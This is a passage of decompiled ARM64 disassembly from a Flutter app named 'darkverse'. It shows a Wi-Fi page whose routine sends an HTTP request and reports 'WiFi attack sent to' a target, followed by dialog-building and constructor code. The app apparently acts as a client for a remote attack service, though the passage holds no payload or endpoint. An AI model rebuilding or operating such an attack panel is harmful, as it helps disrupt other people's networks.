    // 0x94c6a4: r4 = const [0, 0x1, 0, 0x1, null]
    //     0x94c6a4: ldr             x4, [PP, #0x208]  ; [pp+0x208] List(5) [0, 0x1, 0, 0x1, Null]
    // 0x94c6a8: r0 = parse()
    //     0x94c6a8: bl              #0x4a4d3c  ; [dart:core] Uri::parse
    // 0x94c6ac: stur            x0, [fp, #-0x88]
    // 0x94c6b0: mov             x1, x0
    // 0x94c6b4: r4 = const [0, 0x1, 0, 0x1, null]
    //     0x94c6b4: ldr             x4, [PP, #0x208]  ; [pp+0x208] List(5) [0, 0x1, 0, 0x1, Null]
    // 0x94c6b8: r0 = get()
    //     0x94c6b8: bl              #0x6a13f8  ; [package:http/http.dart] ::get
    // 0x94c6bc: mov             x1, x0
    // 0x94c6c0: stur            x1, [fp, #-0x90]
    // 0x94c6c4: r0 = Await()
    //     0x94c6c4: bl              #0x4a3d90  ; AwaitStub
    // 0x94c6c8: LoadField: r1 = r0->field_b
    //     0x94c6c8: ldur            x1, [x0, #0xb]
    // 0x94c6cc: cmp             x1, #0xc8
    // 0x94c6d0: b.ne            #0x94c720
    // 0x94c6d4: ldur            x0, [fp, #-0x78]
    // 0x94c6d8: r1 = Null
    //     0x94c6d8: mov             x1, NULL
    // 0x94c6dc: r2 = 4
    //     0x94c6dc: mov             x2, #4
    // 0x94c6e0: r0 = AllocateArray()
    //     0x94c6e0: bl              #0xbf7bc8  ; AllocateArrayStub
    // 0x94c6e4: r16 = "WiFi attack sent to "
    //     0x94c6e4: add             x16, PP, #0x37, lsl #12  ; [pp+0x376e8] "WiFi attack sent to "
    //     0x94c6e8: ldr             x16, [x16, #0x6e8]
    // 0x94c6ec: StoreField: r0->field_f = r16
    //     0x94c6ec: stur            w16, [x0, #0xf]
    // 0x94c6f0: ldur            x1, [fp, #-0x78]
    // 0x94c6f4: LoadField: r2 = r1->field_13
    //     0x94c6f4: ldur            w2, [x1, #0x13]
    // 0x94c6f8: DecompressPointer r2
    //     0x94c6f8: add             x2, x2, HEAP, lsl #32
    // 0x94c6fc: StoreField: r0->field_13 = r2
    //     0x94c6fc: stur            w2, [x0, #0x13]
    // 0x94c700: str             x0, [SP]
    // 0x94c704: r0 = _interpolate()
    //     0x94c704: bl              #0x45bb80  ; [dart:core] _StringBase::_interpolate
    // 0x94c708: ldur            x1, [fp, #-0x78]
    // 0x94c70c: mov             x3, x0
    // 0x94c710: r2 = "✅ Attack Sent"
    //     0x94c710: add             x2, PP, #0x37, lsl #12  ; [pp+0x376f0] "✅ Attack Sent"
    //     0x94c714: ldr             x2, [x2, #0x6f0]
    // 0x94c718: r0 = _showAlert()
    //     0x94c718: bl              #0x94c7fc  ; [package:darkverse/wifi_internal.dart] _WifiInternalPageState::_showAlert
    // 0x94c71c: b               #0x94c78c
    // 0x94c720: ldur            x1, [fp, #-0x78]
    // 0x94c724: r2 = "❌ Failed"
    //     0x94c724: add             x2, PP, #0x37, lsl #12  ; [pp+0x376f8] "❌ Failed"
    //     0x94c728: ldr             x2, [x2, #0x6f8]
    // 0x94c72c: r3 = "Server rejected request."
    //     0x94c72c: add             x3, PP, #0x37, lsl #12  ; [pp+0x37700] "Server rejected request."
    //     0x94c730: ldr             x3, [x3, #0x700]
    // 0x94c734: r0 = _showAlert()
    //     0x94c734: bl              #0x94c7fc  ; [package:darkverse/wifi_internal.dart] _WifiInternalPageState::_showAlert
    // 0x94c738: b               #0x94c78c
    // 0x94c73c: sub             SP, fp, #0x98
    // 0x94c740: mov             x3, x0
    // 0x94c744: stur            x0, [fp, #-0x88]
    // 0x94c748: mov             x0, x1
    // 0x94c74c: stur            x1, [fp, #-0x90]
    // 0x94c750: r1 = Null
    //     0x94c750: mov             x1, NULL
    // 0x94c754: r2 = 4
    //     0x94c754: mov             x2, #4
    // 0x94c758: r0 = AllocateArray()
    //     0x94c758: bl              #0xbf7bc8  ; AllocateArrayStub
    // 0x94c75c: r16 = "Network error: "
    //     0x94c75c: add             x16, PP, #0x37, lsl #12  ; [pp+0x37708] "Network error: "
    //     0x94c760: ldr             x16, [x16, #0x708]
    // 0x94c764: StoreField: r0->field_f = r16
    //     0x94c764: stur            w16, [x0, #0xf]
    // 0x94c768: ldur            x1, [fp, #-0x88]
    // 0x94c76c: StoreField: r0->field_13 = r1
    //     0x94c76c: stur            w1, [x0, #0x13]
    // 0x94c770: str             x0, [SP]
    // 0x94c774: r0 = _interpolate()
    //     0x94c774: bl              #0x45bb80  ; [dart:core] _StringBase::_interpolate
    // 0x94c778: ldur            x1, [fp, #-0x78]
    // 0x94c77c: mov             x3, x0
    // 0x94c780: r2 = "Error"
    //     0x94c780: add             x2, PP, #0xf, lsl #12  ; [pp+0xfb20] "Error"
    //     0x94c784: ldr             x2, [x2, #0xb20]
    // 0x94c788: r0 = _showAlert()
    //     0x94c788: bl              #0x94c7fc  ; [package:darkverse/wifi_internal.dart] _WifiInternalPageState::_showAlert
    // 0x94c78c: ldur            x2, [fp, #-0x80]
    // 0x94c790: r1 = Function '<anonymous closure>':.
    //     0x94c790: add             x1, PP, #0x37, lsl #12  ; [pp+0x37710] AnonymousClosure: (0x6b14c4), in [package:darkverse/login_page.dart] _LoginPageState::login (0x6ab474)
    //     0x94c794: ldr             x1, [x1, #0x710]
    // 0x94c798: r0 = AllocateClosure()
    //     0x94c798: bl              #0xbf6eac  ; AllocateClosureStub
    // 0x94c79c: ldur            x1, [fp, #-0x78]
    // 0x94c7a0: mov             x2, x0
    // 0x94c7a4: r0 = setState()
    //     0x94c7a4: bl              #0x457110  ; [package:flutter/src/widgets/framework.dart] State::setState
    // 0x94c7a8: r0 = Null
    //     0x94c7a8: mov             x0, NULL
    // 0x94c7ac: r0 = ReturnAsyncNotFuture()
    //     0x94c7ac: b               #0x4a3bc8  ; ReturnAsyncNotFutureStub
    // 0x94c7b0: sub             SP, fp, #0x98
    // 0x94c7b4: ldur            x2, [fp, #-0x80]
    // 0x94c7b8: mov             x3, x0
    // 0x94c7bc: stur            x0, [fp, #-0x88]
    // 0x94c7c0: mov             x0, x1
    // 0x94c7c4: stur            x1, [fp, #-0x90]
    // 0x94c7c8: r1 = Function '<anonymous closure>':.
    //     0x94c7c8: add             x1, PP, #0x37, lsl #12  ; [pp+0x37710] AnonymousClosure: (0x6b14c4), in [package:darkverse/login_page.dart] _LoginPageState::login (0x6ab474)
    //     0x94c7cc: ldr             x1, [x1, #0x710]
    // 0x94c7d0: r0 = AllocateClosure()
    //     0x94c7d0: bl              #0xbf6eac  ; AllocateClosureStub
    // 0x94c7d4: ldur            x1, [fp, #-0x78]
    // 0x94c7d8: mov             x2, x0
    // 0x94c7dc: r0 = setState()
    //     0x94c7dc: bl              #0x457110  ; [package:flutter/src/widgets/framework.dart] State::setState
    // 0x94c7e0: ldur            x0, [fp, #-0x88]
    // 0x94c7e4: ldur            x1, [fp, #-0x90]
    // 0x94c7e8: r0 = ReThrow()
    //     0x94c7e8: bl              #0xbf5da0  ; ReThrowStub
    // 0x94c7ec: brk             #0
    // 0x94c7f0: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x94c7f0: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x94c7f4: b               #0x94c600
    // 0x94c7f8: r0 = NullCastErrorSharedWithoutFPURegs()
    //     0x94c7f8: bl              #0xbf8364  ; NullCastErrorSharedWithoutFPURegsStub
  }
  _ _showAlert(/* No info */) {
    // ** addr: 0x94c7fc, size: 0x9c
    // 0x94c7fc: EnterFrame
    //     0x94c7fc: stp             fp, lr, [SP, #-0x10]!
    //     0x94c800: mov             fp, SP
    // 0x94c804: AllocStack(0x30)
    //     0x94c804: sub             SP, SP, #0x30
    // 0x94c808: SetupParameters(_WifiInternalPageState this /* r1 => r1, fp-0x8 */, dynamic _ /* r2 => r2, fp-0x10 */, dynamic _ /* r3 => r3, fp-0x18 */)
    //     0x94c808: stur            x1, [fp, #-8]
    //     0x94c80c: stur            x2, [fp, #-0x10]
    //     0x94c810: stur            x3, [fp, #-0x18]
    // 0x94c814: CheckStackOverflow
    //     0x94c814: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x94c818: cmp             SP, x16
    //     0x94c81c: b.ls            #0x94c88c
    // 0x94c820: r1 = 3
    //     0x94c820: mov             x1, #3
    // 0x94c824: r0 = AllocateContext()
    //     0x94c824: bl              #0xbf6ad8  ; AllocateContextStub
    // 0x94c828: mov             x1, x0
    // 0x94c82c: ldur            x0, [fp, #-8]
    // 0x94c830: StoreField: r1->field_f = r0
    //     0x94c830: stur            w0, [x1, #0xf]
    // 0x94c834: ldur            x2, [fp, #-0x10]
    // 0x94c838: StoreField: r1->field_13 = r2
    //     0x94c838: stur            w2, [x1, #0x13]
    // 0x94c83c: ldur            x2, [fp, #-0x18]
    // 0x94c840: ArrayStore: r1[0] = r2  ; List_4
    //     0x94c840: stur            w2, [x1, #0x17]
    // 0x94c844: LoadField: r3 = r0->field_f
    //     0x94c844: ldur            w3, [x0, #0xf]
    // 0x94c848: DecompressPointer r3
    //     0x94c848: add             x3, x3, HEAP, lsl #32
    // 0x94c84c: stur            x3, [fp, #-0x10]
    // 0x94c850: cmp             w3, NULL
    // 0x94c854: b.eq            #0x94c894
    // 0x94c858: mov             x2, x1
    // 0x94c85c: r1 = Function '<anonymous closure>':.
    //     0x94c85c: add             x1, PP, #0x37, lsl #12  ; [pp+0x37718] AnonymousClosure: (0x94c898), in [package:darkverse/wifi_internal.dart] _WifiInternalPageState::_showAlert (0x94c7fc)
    //     0x94c860: ldr             x1, [x1, #0x718]
    // 0x94c864: r0 = AllocateClosure()
    //     0x94c864: bl              #0xbf6eac  ; AllocateClosureStub
    // 0x94c868: stp             x0, NULL, [SP, #8]
    // 0x94c86c: ldur            x16, [fp, #-0x10]
    // 0x94c870: str             x16, [SP]
    // 0x94c874: r4 = const [0x1, 0x2, 0x2, 0x2, null]
    //     0x94c874: ldr             x4, [PP, #0x40]  ; [pp+0x40] List(5) [0x1, 0x2, 0x2, 0x2, Null]
    // 0x94c878: r0 = showDialog()
    //     0x94c878: bl              #0x6af738  ; [package:flutter/src/material/dialog.dart] ::showDialog
    // 0x94c87c: r0 = Null
    //     0x94c87c: mov             x0, NULL
    // 0x94c880: LeaveFrame
    //     0x94c880: mov             SP, fp
    //     0x94c884: ldp             fp, lr, [SP], #0x10
    // 0x94c888: ret
    //     0x94c888: ret             
    // 0x94c88c: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x94c88c: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x94c890: b               #0x94c820
    // 0x94c894: r0 = NullCastErrorSharedWithoutFPURegs()
    //     0x94c894: bl              #0xbf8364  ; NullCastErrorSharedWithoutFPURegsStub
  }
  [closure] AlertDialog <anonymous closure>(dynamic, BuildContext) {
    // ** addr: 0x94c898, size: 0x284
    // 0x94c898: EnterFrame
    //     0x94c898: stp             fp, lr, [SP, #-0x10]!
    //     0x94c89c: mov             fp, SP
    // 0x94c8a0: AllocStack(0x30)
    //     0x94c8a0: sub             SP, SP, #0x30
    // 0x94c8a4: SetupParameters([dynamic _ /* r0 */])
    //     0x94c8a4: ldr             x0, [fp, #0x18]
    //     0x94c8a8: ldur            w2, [x0, #0x17]
    //     0x94c8ac: add             x2, x2, HEAP, lsl #32
    //     0x94c8b0: stur            x2, [fp, #-8]
    // 0x94c8b4: CheckStackOverflow
    //     0x94c8b4: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x94c8b8: cmp             SP, x16
    //     0x94c8bc: b.ls            #0x94cb14
    // 0x94c8c0: r0 = Radius()
    //     0x94c8c0: bl              #0x58951c  ; AllocateRadiusStub -> Radius (size=0x18)
    // 0x94c8c4: d0 = 16.000000
    //     0x94c8c4: fmov            d0, #16.00000000
    // 0x94c8c8: stur            x0, [fp, #-0x10]
    // 0x94c8cc: StoreField: r0->field_7 = d0
    //     0x94c8cc: stur            d0, [x0, #7]
    // 0x94c8d0: StoreField: r0->field_f = d0
    //     0x94c8d0: stur            d0, [x0, #0xf]
    // 0x94c8d4: r0 = BorderRadius()
    //     0x94c8d4: bl              #0x58a7d8  ; AllocateBorderRadiusStub -> BorderRadius (size=0x18)
    // 0x94c8d8: mov             x2, x0
    // 0x94c8dc: ldur            x0, [fp, #-0x10]
    // 0x94c8e0: stur            x2, [fp, #-0x18]
    // 0x94c8e4: StoreField: r2->field_7 = r0
    //     0x94c8e4: stur            w0, [x2, #7]
    // 0x94c8e8: StoreField: r2->field_b = r0
    //     0x94c8e8: stur            w0, [x2, #0xb]
    // 0x94c8ec: StoreField: r2->field_f = r0
    //     0x94c8ec: stur            w0, [x2, #0xf]
    // 0x94c8f0: StoreField: r2->field_13 = r0
    //     0x94c8f0: stur            w0, [x2, #0x13]
    // 0x94c8f4: r1 = Instance_Color
    //     0x94c8f4: add             x1, PP, #0x13, lsl #12  ; [pp+0x13d28] Obj!Color@a0f031
    //     0x94c8f8: ldr             x1, [x1, #0xd28]
    // 0x94c8fc: d0 = 0.300000
    //     0x94c8fc: add             x17, PP, #0xd, lsl #12  ; [pp+0xd180] IMM: double(0.3) from 0x3fd3333333333333
    //     0x94c900: ldr             d0, [x17, #0x180]
    // 0x94c904: r0 = withOpacity()
    //     0x94c904: bl              #0xb159d8  ; [dart:ui] Color::withOpacity
    // 0x94c908: stur            x0, [fp, #-0x10]
    // 0x94c90c: r0 = BorderSide()
    //     0x94c90c: bl              #0x58d2d4  ; AllocateBorderSideStub -> BorderSide (size=0x20)
    // 0x94c910: mov             x1, x0
    // 0x94c914: ldur            x0, [fp, #-0x10]
    // 0x94c918: stur            x1, [fp, #-0x20]
    // 0x94c91c: StoreField: r1->field_7 = r0
    //     0x94c91c: stur            w0, [x1, #7]
    // 0x94c920: d0 = 1.000000
    //     0x94c920: fmov            d0, #1.00000000
    // 0x94c924: StoreField: r1->field_b = d0
    //     0x94c924: stur            d0, [x1, #0xb]
    // 0x94c928: r0 = Instance_BorderStyle
    //     0x94c928: add             x0, PP, #0xc, lsl #12  ; [pp+0xce40] Obj!BorderStyle@a406e1
    //     0x94c92c: ldr             x0, [x0, #0xe40]
    // 0x94c930: StoreField: r1->field_13 = r0
    //     0x94c930: stur            w0, [x1, #0x13]
    // 0x94c934: d0 = -1.000000
    //     0x94c934: fmov            d0, #-1.00000000
    // 0x94c938: ArrayStore: r1[0] = d0  ; List_8
    //     0x94c938: stur            d0, [x1, #0x17]
    // 0x94c93c: r0 = RoundedRectangleBorder()
    //     0x94c93c: bl              #0x58ce88  ; AllocateRoundedRectangleBorderStub -> RoundedRectangleBorder (size=0x10)
    // 0x94c940: mov             x1, x0
    // 0x94c944: ldur            x0, [fp, #-0x18]
    // 0x94c948: stur            x1, [fp, #-0x28]
    // 0x94c94c: StoreField: r1->field_b = r0
    //     0x94c94c: stur            w0, [x1, #0xb]
    // 0x94c950: ldur            x0, [fp, #-0x20]
    // 0x94c954: StoreField: r1->field_7 = r0
    //     0x94c954: stur            w0, [x1, #7]
    // 0x94c958: ldur            x2, [fp, #-8]
    // 0x94c95c: LoadField: r0 = r2->field_13
    //     0x94c95c: ldur            w0, [x2, #0x13]
    // 0x94c960: DecompressPointer r0
    //     0x94c960: add             x0, x0, HEAP, lsl #32
    // 0x94c964: stur            x0, [fp, #-0x10]
    // 0x94c968: r0 = TextStyle()
    //     0x94c968: bl              #0x4da23c  ; AllocateTextStyleStub -> TextStyle (size=0x70)
    // 0x94c96c: mov             x1, x0
    // 0x94c970: r0 = true
    //     0x94c970: add             x0, NULL, #0x20  ; true
    // 0x94c974: stur            x1, [fp, #-0x18]
    // 0x94c978: StoreField: r1->field_7 = r0
    //     0x94c978: stur            w0, [x1, #7]
    // 0x94c97c: r2 = Instance_Color
    //     0x94c97c: add             x2, PP, #0x13, lsl #12  ; [pp+0x13d28] Obj!Color@a0f031
    //     0x94c980: ldr             x2, [x2, #0xd28]
    // 0x94c984: StoreField: r1->field_b = r2
    //     0x94c984: stur            w2, [x1, #0xb]
    // 0x94c988: r3 = "Orbitron"
    //     0x94c988: add             x3, PP, #0xc, lsl #12  ; [pp+0xcf20] "Orbitron"
    //     0x94c98c: ldr             x3, [x3, #0xf20]
    // 0x94c990: StoreField: r1->field_13 = r3
    //     0x94c990: stur            w3, [x1, #0x13]
    // 0x94c994: r0 = Text()
    //     0x94c994: bl              #0x641544  ; AllocateTextStub -> Text (size=0x50)
    // 0x94c998: mov             x1, x0
    // 0x94c99c: ldur            x0, [fp, #-0x10]
    // 0x94c9a0: stur            x1, [fp, #-0x20]
    // 0x94c9a4: StoreField: r1->field_b = r0
    //     0x94c9a4: stur            w0, [x1, #0xb]
    // 0x94c9a8: ldur            x0, [fp, #-0x18]
    // 0x94c9ac: StoreField: r1->field_13 = r0
    //     0x94c9ac: stur            w0, [x1, #0x13]
    // 0x94c9b0: ldur            x2, [fp, #-8]
    // 0x94c9b4: ArrayLoad: r0 = r2[0]  ; List_4
    //     0x94c9b4: ldur            w0, [x2, #0x17]
    // 0x94c9b8: DecompressPointer r0
    //     0x94c9b8: add             x0, x0, HEAP, lsl #32
    // 0x94c9bc: stur            x0, [fp, #-0x18]
    // 0x94c9c0: LoadField: r3 = r2->field_f
    //     0x94c9c0: ldur            w3, [x2, #0xf]
    // 0x94c9c4: DecompressPointer r3
    //     0x94c9c4: add             x3, x3, HEAP, lsl #32
    // 0x94c9c8: LoadField: r4 = r3->field_2b
    //     0x94c9c8: ldur            w4, [x3, #0x2b]
    // 0x94c9cc: DecompressPointer r4
    //     0x94c9cc: add             x4, x4, HEAP, lsl #32
    // 0x94c9d0: stur            x4, [fp, #-0x10]
    // 0x94c9d4: r0 = TextStyle()
    //     0x94c9d4: bl              #0x4da23c  ; AllocateTextStyleStub -> TextStyle (size=0x70)
    // 0x94c9d8: mov             x1, x0
    // 0x94c9dc: r0 = true
    //     0x94c9dc: add             x0, NULL, #0x20  ; true
    // 0x94c9e0: stur            x1, [fp, #-0x30]
    // 0x94c9e4: StoreField: r1->field_7 = r0
    //     0x94c9e4: stur            w0, [x1, #7]
    // 0x94c9e8: ldur            x2, [fp, #-0x10]
    // 0x94c9ec: StoreField: r1->field_b = r2
    //     0x94c9ec: stur            w2, [x1, #0xb]
    // 0x94c9f0: r0 = Text()
    //     0x94c9f0: bl              #0x641544  ; AllocateTextStub -> Text (size=0x50)
    // 0x94c9f4: mov             x1, x0
    // 0x94c9f8: ldur            x0, [fp, #-0x18]
    // 0x94c9fc: stur            x1, [fp, #-0x10]
    // 0x94ca00: StoreField: r1->field_b = r0
    //     0x94ca00: stur            w0, [x1, #0xb]
    // 0x94ca04: ldur            x0, [fp, #-0x30]
    // 0x94ca08: StoreField: r1->field_13 = r0
    //     0x94ca08: stur            w0, [x1, #0x13]
    // 0x94ca0c: r0 = TextStyle()
    //     0x94ca0c: bl              #0x4da23c  ; AllocateTextStyleStub -> TextStyle (size=0x70)
    // 0x94ca10: mov             x1, x0
    // 0x94ca14: r0 = true
    //     0x94ca14: add             x0, NULL, #0x20  ; true
    // 0x94ca18: stur            x1, [fp, #-0x18]
    // 0x94ca1c: StoreField: r1->field_7 = r0
    //     0x94ca1c: stur            w0, [x1, #7]
    // 0x94ca20: r2 = Instance_Color
    //     0x94ca20: add             x2, PP, #0x13, lsl #12  ; [pp+0x13d28] Obj!Color@a0f031
    //     0x94ca24: ldr             x2, [x2, #0xd28]
    // 0x94ca28: StoreField: r1->field_b = r2
    //     0x94ca28: stur            w2, [x1, #0xb]
    // 0x94ca2c: r0 = Text()
    //     0x94ca2c: bl              #0x641544  ; AllocateTextStub -> Text (size=0x50)
    // 0x94ca30: mov             x1, x0
    // 0x94ca34: r0 = "OK"
    //     0x94ca34: add             x0, PP, #0x16, lsl #12  ; [pp+0x16d90] "OK"
    //     0x94ca38: ldr             x0, [x0, #0xd90]
    // 0x94ca3c: stur            x1, [fp, #-0x30]
    // 0x94ca40: StoreField: r1->field_b = r0
    //     0x94ca40: stur            w0, [x1, #0xb]
    // 0x94ca44: ldur            x0, [fp, #-0x18]
    // 0x94ca48: StoreField: r1->field_13 = r0
    //     0x94ca48: stur            w0, [x1, #0x13]
    // 0x94ca4c: r0 = TextButton()
    //     0x94ca4c: bl              #0x6ce7d0  ; AllocateTextButtonStub -> TextButton (size=0x40)
    // 0x94ca50: mov             x3, x0
    // 0x94ca54: r0 = false
    //     0x94ca54: add             x0, NULL, #0x30  ; false
    // 0x94ca58: stur            x3, [fp, #-0x18]
    // 0x94ca5c: StoreField: r3->field_3b = r0
    //     0x94ca5c: stur            w0, [x3, #0x3b]
    // 0x94ca60: ldur            x2, [fp, #-8]
    // 0x94ca64: r1 = Function '<anonymous closure>':.
    //     0x94ca64: add             x1, PP, #0x37, lsl #12  ; [pp+0x37720] AnonymousClosure: (0x73d18c), in [package:darkverse/install_panel_page.dart] _InstallPanelPageState::_actionButton (0x73d1f4)
    //     0x94ca68: ldr             x1, [x1, #0x720]
    // 0x94ca6c: r0 = AllocateClosure()
    //     0x94ca6c: bl              #0xbf6eac  ; AllocateClosureStub
    // 0x94ca70: mov             x1, x0
    // 0x94ca74: ldur            x0, [fp, #-0x18]
    // 0x94ca78: StoreField: r0->field_b = r1
    //     0x94ca78: stur            w1, [x0, #0xb]
    // 0x94ca7c: r3 = false
    //     0x94ca7c: add             x3, NULL, #0x30  ; false
    // 0x94ca80: StoreField: r0->field_27 = r3
    //     0x94ca80: stur            w3, [x0, #0x27]
    // 0x94ca84: r1 = true
    //     0x94ca84: add             x1, NULL, #0x20  ; true
    // 0x94ca88: StoreField: r0->field_2f = r1
    //     0x94ca88: stur            w1, [x0, #0x2f]
    // 0x94ca8c: ldur            x1, [fp, #-0x30]
    // 0x94ca90: StoreField: r0->field_37 = r1
    //     0x94ca90: stur            w1, [x0, #0x37]
    // 0x94ca94: r1 = Null
    //     0x94ca94: mov             x1, NULL
    // 0x94ca98: r2 = 2
    //     0x94ca98: mov             x2, #2
    // 0x94ca9c: r0 = AllocateArray()
    //     0x94ca9c: bl              #0xbf7bc8  ; AllocateArrayStub
    // 0x94caa0: mov             x2, x0
    // 0x94caa4: ldur            x0, [fp, #-0x18]
    // 0x94caa8: stur            x2, [fp, #-8]
    // 0x94caac: StoreField: r2->field_f = r0
    //     0x94caac: stur            w0, [x2, #0xf]
    // 0x94cab0: r1 = <Widget>
    //     0x94cab0: ldr             x1, [PP, #0x5168]  ; [pp+0x5168] TypeArguments: <Widget>
    // 0x94cab4: r0 = AllocateGrowableArray()
    //     0x94cab4: bl              #0xbf6a98  ; AllocateGrowableArrayStub
    // 0x94cab8: mov             x1, x0
    // 0x94cabc: ldur            x0, [fp, #-8]
    // 0x94cac0: stur            x1, [fp, #-0x18]
    // 0x94cac4: StoreField: r1->field_f = r0
    //     0x94cac4: stur            w0, [x1, #0xf]
    // 0x94cac8: r0 = 2
    //     0x94cac8: mov             x0, #2
    // 0x94cacc: StoreField: r1->field_b = r0
    //     0x94cacc: stur            w0, [x1, #0xb]
    // 0x94cad0: r0 = AlertDialog()
    //     0x94cad0: bl              #0x7955d8  ; AllocateAlertDialogStub -> AlertDialog (size=0x70)
    // 0x94cad4: ldur            x1, [fp, #-0x20]
    // 0x94cad8: StoreField: r0->field_f = r1
    //     0x94cad8: stur            w1, [x0, #0xf]
    // 0x94cadc: ldur            x1, [fp, #-0x10]
    // 0x94cae0: StoreField: r0->field_1b = r1
    //     0x94cae0: stur            w1, [x0, #0x1b]
    // 0x94cae4: ldur            x1, [fp, #-0x18]
    // 0x94cae8: StoreField: r0->field_27 = r1
    //     0x94cae8: stur            w1, [x0, #0x27]
    // 0x94caec: r1 = Instance_Color
    //     0x94caec: add             x1, PP, #0x32, lsl #12  ; [pp+0x32708] Obj!Color@a11581
    //     0x94caf0: ldr             x1, [x1, #0x708]
    // 0x94caf4: StoreField: r0->field_43 = r1
    //     0x94caf4: stur            w1, [x0, #0x43]
    // 0x94caf8: ldur            x1, [fp, #-0x28]
    // 0x94cafc: StoreField: r0->field_5f = r1
    //     0x94cafc: stur            w1, [x0, #0x5f]
    // 0x94cb00: r1 = false
    //     0x94cb00: add             x1, NULL, #0x30  ; false
    // 0x94cb04: StoreField: r0->field_6b = r1
    //     0x94cb04: stur            w1, [x0, #0x6b]
    // 0x94cb08: LeaveFrame
    //     0x94cb08: mov             SP, fp
    //     0x94cb0c: ldp             fp, lr, [SP], #0x10
    // 0x94cb10: ret
    //     0x94cb10: ret             
    // 0x94cb14: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x94cb14: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x94cb18: b               #0x94c8c0
  }
  _ initState(/* No info */) {
    // ** addr: 0x98ecac, size: 0x30
    // 0x98ecac: EnterFrame
    //     0x98ecac: stp             fp, lr, [SP, #-0x10]!
    //     0x98ecb0: mov             fp, SP
    // 0x98ecb4: CheckStackOverflow
    //     0x98ecb4: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x98ecb8: cmp             SP, x16
    //     0x98ecbc: b.ls            #0x98ecd4
    // 0x98ecc0: r0 = _loadPublicInfo()
    //     0x98ecc0: bl              #0x82bd34  ; [package:darkverse/wifi_internal.dart] _WifiInternalPageState::_loadPublicInfo
    // 0x98ecc4: r0 = Null
    //     0x98ecc4: mov             x0, NULL
    // 0x98ecc8: LeaveFrame
    //     0x98ecc8: mov             SP, fp
    //     0x98eccc: ldp             fp, lr, [SP], #0x10
    // 0x98ecd0: ret
    //     0x98ecd0: ret             
    // 0x98ecd4: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x98ecd4: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x98ecd8: b               #0x98ecc0
  }
  _ _WifiInternalPageState(/* No info */) {
    // ** addr: 0x9eea8c, size: 0xac
    // 0x9eea8c: EnterFrame
    //     0x9eea8c: stp             fp, lr, [SP, #-0x10]!
    //     0x9eea90: mov             fp, SP
    // 0x9eea94: AllocStack(0x8)
    //     0x9eea94: sub             SP, SP, #8
    // 0x9eea98: r5 = "-"
    //     0x9eea98: ldr             x5, [PP, #0x33d0]  ; [pp+0x33d0] "-"
    // 0x9eea9c: r4 = false
    //     0x9eea9c: add             x4, NULL, #0x30  ; false
    // 0x9eeaa0: r3 = true
    //     0x9eeaa0: add             x3, NULL, #0x20  ; true
    // 0x9eeaa4: r2 = Instance_Color
    //     0x9eeaa4: add             x2, PP, #0x13, lsl #12  ; [pp+0x13d28] Obj!Color@a0f031
    //     0x9eeaa8: ldr             x2, [x2, #0xd28]
    // 0x9eeaac: r0 = Instance_Color
    //     0x9eeaac: add             x0, PP, #0x32, lsl #12  ; [pp+0x32708] Obj!Color@a11581
    //     0x9eeab0: ldr             x0, [x0, #0x708]
    // 0x9eeab4: stur            x1, [fp, #-8]
    // 0x9eeab8: StoreField: r1->field_13 = r5
    //     0x9eeab8: stur            w5, [x1, #0x13]
    // 0x9eeabc: ArrayStore: r1[0] = r5  ; List_4
    //     0x9eeabc: stur            w5, [x1, #0x17]
    // 0x9eeac0: StoreField: r1->field_1b = r5
    //     0x9eeac0: stur            w5, [x1, #0x1b]
    // 0x9eeac4: StoreField: r1->field_1f = r4
    //     0x9eeac4: stur            w4, [x1, #0x1f]
    // 0x9eeac8: StoreField: r1->field_23 = r3
    //     0x9eeac8: stur            w3, [x1, #0x23]
    // 0x9eeacc: StoreField: r1->field_27 = r4
    //     0x9eeacc: stur            w4, [x1, #0x27]
    // 0x9eead0: StoreField: r1->field_2f = r2
    //     0x9eead0: stur            w2, [x1, #0x2f]
    // 0x9eead4: StoreField: r1->field_33 = r0
    //     0x9eead4: stur            w0, [x1, #0x33]
    // 0x9eead8: r0 = Color()
    //     0x9eead8: bl              #0x4de1ac  ; AllocateColorStub -> Color (size=0x2c)
    // 0x9eeadc: r1 = Instance_ColorSpace
    //     0x9eeadc: ldr             x1, [PP, #0x6e40]  ; [pp+0x6e40] Obj!ColorSpace@a43d01
    // 0x9eeae0: StoreField: r0->field_27 = r1
    //     0x9eeae0: stur            w1, [x0, #0x27]
    // 0x9eeae4: d0 = 0.866667
    //     0x9eeae4: add             x17, PP, #0xb, lsl #12  ; [pp+0xb870] IMM: double(0.8666666666666667) from 0x3febbbbbbbbbbbbc
    //     0x9eeae8: ldr             d0, [x17, #0x870]
    // 0x9eeaec: StoreField: r0->field_7 = d0
    //     0x9eeaec: stur            d0, [x0, #7]
    // 0x9eeaf0: d0 = 0.101961
    //     0x9eeaf0: ldr             d0, [PP, #0x6f30]  ; [pp+0x6f30] IMM: double(0.10196078431372549) from 0x3fba1a1a1a1a1a1a
    // 0x9eeaf4: StoreField: r0->field_f = d0
    //     0x9eeaf4: stur            d0, [x0, #0xf]
    // 0x9eeaf8: d0 = 0.047059
    //     0x9eeaf8: add             x17, PP, #0xc, lsl #12  ; [pp+0xcee0] IMM: double(0.047058823529411764) from 0x3fa8181818181818
    //     0x9eeafc: ldr             d0, [x17, #0xee0]
    // 0x9eeb00: ArrayStore: r0[0] = d0  ; List_8
    //     0x9eeb00: stur            d0, [x0, #0x17]
    // 0x9eeb04: StoreField: r0->field_1f = d0
    //     0x9eeb04: stur            d0, [x0, #0x1f]
    // 0x9eeb08: ldur            x1, [fp, #-8]
    // 0x9eeb0c: StoreField: r1->field_2b = r0
    //     0x9eeb0c: stur            w0, [x1, #0x2b]
    //     0x9eeb10: ldurb           w16, [x1, #-1]
    //     0x9eeb14: ldurb           w17, [x0, #-1]
    //     0x9eeb18: and             x16, x17, x16, lsr #2
    //     0x9eeb1c: tst             x16, HEAP, lsr #32
    //     0x9eeb20: b.eq            #0x9eeb28
    //     0x9eeb24: bl              #0xbf6234  ; WriteBarrierWrappersStub
